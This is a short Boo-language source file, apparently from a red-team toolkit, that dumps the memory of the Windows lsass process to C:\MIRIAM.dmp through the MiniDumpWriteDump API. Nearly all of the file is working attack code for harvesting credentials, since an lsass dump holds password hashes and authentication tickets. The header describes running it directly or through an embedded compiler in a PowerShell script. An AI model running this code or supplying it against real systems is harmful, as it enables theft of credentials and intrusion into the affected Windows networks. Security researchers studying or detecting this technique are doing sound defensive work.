import System.Runtime.InteropServices
from System.Diagnostics import Process
from System.IO import FileStream, FileMode, FileAccess,FileShare

/*
Author: Marcello Salvati (@byt3bl33d3r)
License: BSD 3-Clause

This Boolang source file can be run directly with the booi.exe interpreter or using the embedded compiler in runBoo.cs/Invoke-JumpScare.ps1

*/

[DllImport("Dbghelp.dll", EntryPoint:"MiniDumpWriteDump")]
def minidumpwritedump(hProcess as int, ProcessId as int, hFile as int, DumpType as int, ExceptionParam as int, UserStreamParam as int, CallbackParam as int):
    pass

def main():
    procname = 'lsass'
    ids = Process.GetProcessesByName(procname)
    for pid in ids:
        file = "C:\\MIRIAM.dmp"
        fs = FileStream(file, FileMode.Create, FileAccess.ReadWrite, FileShare.Write)
        minidumpwritedump(pid.Handle, pid.Id, fs.Handle,0x00000002,0,0,0)

    print "Dumped to $file"
